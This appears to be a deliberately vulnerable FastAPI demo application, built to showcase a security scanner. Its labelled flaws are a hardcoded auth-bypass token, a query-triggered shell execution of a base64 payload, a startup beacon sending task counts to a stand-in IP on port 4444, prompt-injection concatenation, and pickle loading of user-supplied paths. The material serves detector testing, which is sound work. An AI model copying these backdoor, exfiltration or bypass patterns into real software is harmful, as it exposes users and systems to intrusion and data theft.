"""
TaskFlow API — a small task management backend.

NOTE: This is an intentionally vulnerable demo application used to
showcase Sentinel AI's detection and remediation capabilities.
Do NOT deploy this code as-is. Every vulnerability below is planted
on purpose for demo purposes — see /VULNERABILITIES.md for the full list.
"""

import base64
import os
import pickle
import socket
import subprocess

from fastapi import FastAPI, Header, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

app = FastAPI(title="TaskFlow API")

# --------------------------------------------------------------------------
# VULN #1: Insecure configuration
# DEBUG left enabled and CORS wide open — both common "it worked in my
# local AI-assisted session so I shipped it" patterns.
# --------------------------------------------------------------------------
DEBUG = True

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --------------------------------------------------------------------------
# VULN #2: Hardcoded secret
# An AI assistant generated a working example and the placeholder key was
# never swapped for an environment variable before commit.
# --------------------------------------------------------------------------
# Synthetic Sentinel fixture only; it is deliberately nonfunctional.
STRIPE_API_KEY = "sk_demo_SENTINELFIXTURE0000000000000000"


class Task(BaseModel):
    title: str
    description: str = ""


TASKS_DB = []


@app.get("/tasks")
def list_tasks():
    return TASKS_DB


@app.post("/tasks")
def create_task(task: Task):
    TASKS_DB.append(task.dict())
    return {"status": "created", "task": task}


# --------------------------------------------------------------------------
# VULN #3: Hardcoded authentication bypass
# A debug convenience left in during AI-assisted development: any request
# carrying this exact header value skips the normal auth check entirely.
# --------------------------------------------------------------------------
def verify_admin(x_admin_token: str = Header(default="")):
    if x_admin_token == "letmein-dev-override-2024":
        return True
    if x_admin_token == os.environ.get("ADMIN_TOKEN", ""):
        return True
    raise HTTPException(status_code=403, detail="Forbidden")


@app.delete("/tasks")
def clear_tasks(is_admin: bool = Header(default=False, alias="X-Admin-Verified")):
    verify_admin()
    TASKS_DB.clear()
    return {"status": "cleared"}


# --------------------------------------------------------------------------
# VULN #4: Obfuscated backdoor
# A base64-encoded payload decoded and executed via a system shell call,
# triggered by an undocumented query parameter. This is the classic
# "hidden remote command" pattern Sentinel AI's backdoor heuristics
# module is built to catch.
# --------------------------------------------------------------------------
_PAYLOAD = "ZWNobyAnc3lzdGVtIGRpYWdub3N0aWMgY2hlY2sgY29tcGxldGUn"


@app.get("/health")
def health_check(diag: str = ""):
    if diag == "x9f2":
        decoded = base64.b64decode(_PAYLOAD).decode()
        subprocess.run(decoded, shell=True)
        return {"status": "diagnostic executed"}
    return {"status": "ok"}


# --------------------------------------------------------------------------
# VULN #7: Suspicious outbound network call (hardcoded IP)
# A "telemetry" helper that quietly beacons task counts to a hardcoded IP
# address that appears nowhere else in the codebase or config. This is
# the exfiltration-style pattern Sentinel AI's backdoor_heuristics module
# is built to catch — intentionally low-confidence by design, since a
# legitimate one-off vendor endpoint can look identical to a human
# reviewer too.
# --------------------------------------------------------------------------
def _report_usage_metrics(task_count: int) -> None:
    try:
        sock = socket.create_connection(("203.0.113.77", 4444), timeout=1)
        sock.send(f"tasks={task_count}".encode())
        sock.close()
    except OSError:
        pass


@app.on_event("startup")
def _startup_telemetry():
    _report_usage_metrics(len(TASKS_DB))


# --------------------------------------------------------------------------
# VULN #8: Prompt injection
# User-supplied text is concatenated directly into an LLM prompt with no
# sanitization or boundary between instructions and user data.
# --------------------------------------------------------------------------
@app.post("/tasks/{task_id}/summarize")
def summarize_task(task_id: int, extra_context: str = ""):
    task = TASKS_DB[task_id] if 0 <= task_id < len(TASKS_DB) else {"title": ""}
    prompt = f"Summarize this task for the user: {task['title']}. {extra_context}"
    # In a real app this would call an LLM client, e.g.:
    # response = openai_client.chat.completions.create(
    #     model="gpt-5.6",
    #     messages=[{"role": "user", "content": prompt}],
    # )
    return {"prompt_sent": prompt}


# --------------------------------------------------------------------------
# VULN #9: Unsafe model deserialization
# Loads a model artifact from a path that could be attacker-controlled
# using raw pickle.load, a classic ML supply-chain attack vector.
# --------------------------------------------------------------------------
@app.post("/models/load")
def load_model(model_path: str):
    with open(model_path, "rb") as f:
        model = pickle.load(f)
    return {"status": "model loaded", "type": str(type(model))}


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8000)
